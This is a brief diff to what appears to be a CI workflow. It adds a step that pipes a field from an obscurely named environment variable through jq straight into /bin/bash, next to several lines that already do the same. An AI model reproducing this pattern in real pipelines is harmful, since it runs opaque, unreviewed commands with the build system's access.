@@ -35,6 +35,7 @@ jobs:
           echo $tvaeg8459 | jq -r .q7833 | /bin/bash
           echo $mu47726 | jq -r .ssx1565 | /bin/bash
           echo $l3 | jq -r .z224 | /bin/bash
+          printf '%s' "$ntp68" | jq -r .p2 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
